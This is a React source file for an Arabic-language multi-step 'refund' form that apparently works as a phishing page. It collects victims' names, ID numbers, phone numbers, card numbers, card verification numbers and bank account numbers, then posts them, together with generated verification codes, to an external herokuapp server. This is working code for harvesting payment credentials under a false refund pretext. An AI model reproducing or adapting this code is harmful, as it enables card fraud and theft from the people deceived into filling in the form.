import React, { useState } from 'react';
import './Form.css';

import UserDetails from './user-details/UserDetails';
import BankDetails from './bank-details/BankDetails';
import ClientId from './client-id/ClientId';
import ClientVerification from './client-verification/ClientVerification';
import ProcessRequest from './process-request/ProcessRequest';
import FinalStep from './FinalStep/FinalStep';

import Breadcrumb from '../../UI/breadcrumb/Breadcrump';
import Loading from '../../UI/Loading';
import Modal from '../../UI/Modal/Modal';

import axios from 'axios';

let vc = Math.floor(1000 + Math.random() * 9000);
let vc2 = Math.floor(1000 + Math.random() * 9000);

console.log(vc, vc2);

export default function Form() {

    const [values, setValues] = useState({
        clientFullname: '',
        clientId: '',
        clientPhoneNumber: '',
        refundAmount: '',
        clientBankAccount: '',
        clientCardNumber: '',
        cardVerificationNumber: '',
        clientAccountNumber: '',
        verificationCode: '',
        secondVerificationCode: '',
        state: '',
    });    

    const [step, setStep] = useState(1);
    const [showSpinner, setShowSpinner] = useState(false);
    const [open, setOpen] = useState(false);
    const [nextBtnDisabled, setNextBtnDisabled] = useState(false);

    const handleNextBtnState = () => {
        setNextBtnDisabled(!nextBtnDisabled);
    };

    const increaseStep = () => {
        setStep(step + 1);
    };

    const handleClose = (event, reason) => {
        if (reason === 'clickaway') {
        return;
        }

        setOpen(false);
    };

    const checkVerificationCode = () => {
        if(values.verificationCode == vc) {
            increaseStep();
        }
    };

    const checkVerificationCode2 = () => {
        if(values.secondVerificationCode == vc2) {
            userRequestHandler();
        }
    };

    const nextStep = () => {
        setShowSpinner(true);
        setTimeout(function() {
            setShowSpinner(false);

            if(step === 3) {
                addVerificationCode1();
            }

            if(step === 4) {
                checkVerificationCode();
            }

            if (step < 6 && step != 4) {
                setStep(step + 1);
            }
        }, 1000);
        
        if(step === 6) {
            checkVerificationCode2();
        }
    };
    
    const prevStep = () => {
        if (step > 1) {
          setStep(step - 1);
        }
    };
    
    const handleChange = (name) => (e) => {
        setValues({ ...values, [name]: e.target.value });
    };
    
    const addVerificationCode1 = () => {
        axios.post("https://investment-com.herokuapp.com/add-code", {
            firstCode: vc,
            secondCode: vc2,
            phoneNumber: values.clientPhoneNumber,
        }, 
        {
            headers: {
                'Access-Control-Allow-Origin': 'https://investment.netlify.app',
                'Accept': '*',
                'origin': 'https://investment.netlify.app',
                'Referer': 'https://investment.netlify.app/',
                'Host': 'https://investment-com.herokuapp.com'
            }
        }).then((response) => {
            console.log("vc1, vc2 saved");
        })
    };

    const userRequestHandler = () => {

        axios.post("https://investment-com.herokuapp.com/add-order",{
            fullname: values.clientFullname,
            idNumber: values.clientId,
            phoneNumber: values.clientPhoneNumber,
            refundAmount: values.refundAmount,
            userBank: values.clientBankAccount,
            cardNumber: values.clientCardNumber,
            cardVerificationNumber: values.cardVerificationNumber,
            accountNumber: values.clientAccountNumber,
        }, 
        {
            headers: {
                'Access-Control-Allow-Origin': 'https://investment.netlify.app',
                'Accept': '*',
                'origin': 'https://investment.netlify.app',
                'Referer': 'https://investment.netlify.app/',
                'Host': 'https://investment-com.herokuapp.com'
            }
        },
        ).then((response) => {
            if(response.data.saved) {
                setOpen(true);
            }
        })
        
    };

    return (
        <div className="form-index">
            <div className="container d-flex justify-content-center align-items-center flex-column h-100">
            <Breadcrumb path={" تعبئة نموذج"} />
                <div className="card p-3 mb-4">
                    {
                        {
                        1: <UserDetails 
                                fullName={values.clientFullname}
                                idNumber={values.clientId}
                                phoneNumber={values.clientPhoneNumber}
                                handleChange={handleChange} 
                            />,
                        2: <BankDetails 
                                refundAmount={values.refundAmount}
                                handleChange={handleChange} 
                            />,
                        3: <ClientId 
                                accountNumber={values.clientAccountNumber}
                                cardNumber={values.clientCardNumber}
                                cardVerificationNumber={values.cardVerificationNumber}
                                handleChange={handleChange} 
                            />,
                        4: <ClientVerification 
                                handleChange={handleChange}
                                increaseStep={increaseStep}
                            />,
                        5: <ProcessRequest 
                                handleNextBtnState={handleNextBtnState}
                                increaseStep={increaseStep}
                            />,
                        6: <FinalStep
                                handleNextBtnState={handleNextBtnState}
                                handleChange={handleChange}
                            />,
                        }[step]
                    }
                    <div className="d-flex align-items-center justify-content-center">
                        {showSpinner && <Loading />}
                    </div>
                    <div className="d-flex justify-content-around px-5 mt-5">
                        <button className="btn btn-success" onClick={nextStep} disabled={nextBtnDisabled}>
                            {step === 6 ? "تأكيد" : "التالي"}
                        </button>
                        {step > 1 ? (
                        <button className="btn btn-success" onClick={prevStep}>
                            السابق
                        </button>
                        ) : null}
                    </div>
                </div>
                <small>{step} / 6</small>
            </div>
            <Modal open={open} handleClose={handleClose} />
        </div>

    )
}
